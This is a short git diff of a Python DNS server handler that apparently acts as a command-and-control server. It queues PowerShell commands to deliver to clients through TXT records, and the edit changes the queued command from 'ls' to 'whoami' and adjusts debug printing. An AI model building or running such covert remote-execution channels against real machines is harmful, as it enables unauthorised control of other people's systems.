@@ -19,7 +19,7 @@ class IndividualClientHandler(BaseRequestHandler):
         self.record_type = "TXT"
         self.latest_request_id = None
         self.latest_request_confirmed = False
-        self.queued_commands = [("POWERSHELL_EXECUTE", "ls")]
+        self.queued_commands = [("POWERSHELL_EXECUTE", "whoami")]
         self.sent_commands = []
     
     def __repr__(self):
@@ -29,9 +29,9 @@ class IndividualClientHandler(BaseRequestHandler):
     def handle(self):
         data = self.get_data()
         request = dnslib.DNSRecord.parse(data)
+        print(threading.current_thread().name)
         # Check IDs for repeat numbers, ignore if processed
         if not self.latest_request_id == request.header.id:
-            print(request)
             if request.header.get_opcode() == 0:
                 self.latest_request_id = request.header.id
                 latest_request_confirmed = False
